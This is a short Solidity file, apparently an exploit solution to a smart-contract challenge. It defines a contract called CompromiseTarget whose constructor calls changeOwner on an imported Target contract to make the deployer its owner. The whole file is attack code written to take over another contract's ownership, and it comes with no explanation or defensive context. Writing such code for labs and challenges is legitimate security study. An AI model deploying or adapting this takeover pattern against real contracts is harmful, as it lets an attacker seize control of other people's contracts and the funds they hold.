// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Target.sol";

contract CompromiseTarget {
    constructor(address _target) {
        Target(_target).changeOwner(msg.sender);
    }
}
